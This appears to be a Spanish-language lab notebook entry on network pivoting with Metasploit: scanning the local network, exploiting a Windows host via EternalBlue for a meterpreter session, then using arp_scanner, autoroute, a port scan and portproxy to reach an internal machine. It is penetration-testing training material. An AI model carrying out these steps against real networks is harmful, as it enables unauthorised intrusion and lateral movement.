
Primero debemos de reconocer en la red en la que se encuentra nuestra maquina.
`arp-scan -I eth0 --localnet`

Tendremos que hacer la intrusión a la maquina Windows. Para ello usaremos Metasploit, para explotar un EternalBlue o la explotación que hayamos realizado anteriormente.
`search eternalblue`
`use <Numero_id>`

Configuramos la IP de la maquina victima. Y ejecutamos el exploit.
`set RHOST`
`run`

Ya hemos obtenido una sesión de meterpreter.

En la sesión deberemos de usar el comando `ipconfig`, y esto nos muestra que tiene dos interfaces de red, con dos IP's diferentes.
Dejamos en segundo plano la sesión de meterpreter con `ctrl + z`, para ver que esta en segundo plano podemos usar el comando `sessions -l` 

Usaremos un modulo de [[METASPLOIT]], sirve para encontrar equipos dentro de la red interna.
`use post/windows/gather/arp_scanner`
`
Vemos las opciones de configuración con el comando `show options`
Debemos de configurar los siguientes campos.
`set SESSION`
`set RHOSTS <IP_de_segunda_interfaz_encontrada/X>`

Ejecutamos el modulo.
`run`

Nos encuentra varias direcciones IP, tenemos que apuntarlas para tenerlas en cuenta.
Debemos de probar contra todas las IP's la .1 y .2 si tienen la misma MAC no hace falta. La IP .255 tampoco es necesaria.

Una vez la tenemos identificada debemos de enrutar el trafico, para que el trafico de la maquina de la red interna pase al de la maquina atacante.
Para ello usaremos el siguiente modulo.
`use multi/manage/autoroute`

Nos pide que configuremos únicamente el id de sesión.
`set SESSION`

Una vez configurado ejecutamos el comando `run`, una vez lo tenemos debemos de hacer un escaneo de puertos, con el siguiente modulo para encontrar la IP de la maquina victima.
`use axiliari/scanner/portscan/tcp`

Vemos las opciones de configuración `show options`, nos pide la IP de la maquina victima.
`set RHOST`
Podemos ejecutar el comando con `run`, nos mostrara todos los puertos abiertos.
*ESPERAR A TODOS LOS PUERTOS*

Ahora usaremos el siguiente modulo, que solo se usa en Windows para realizar el pivoting.
`use post/windows/manage/portproxy`

Deberemos de configurar los siguientes cuatro apartados.
`set CONNECT_ADDRESS <IP_MAquina_Victima>`
`set CONNECT_PORT <Puerto_al_que_atacar>`
`set LOCAL_ADDRESS 0.0.0.0` (Siempre así)
`set LOCAL_PORT 5000` (Puerto de escucha en maquina atacante)
`set SESSION <id_sesion>`

Ejecutamos el modulo con el comando `run`

Una vez ejecutado desde el navegador, buscamos la IP de la maquina Windows (La del medio) con el puerto configurado en [[METASPLOIT]] en esta caso el puerto 5000.
Así podemos ver que esta corriendo en la maquina final.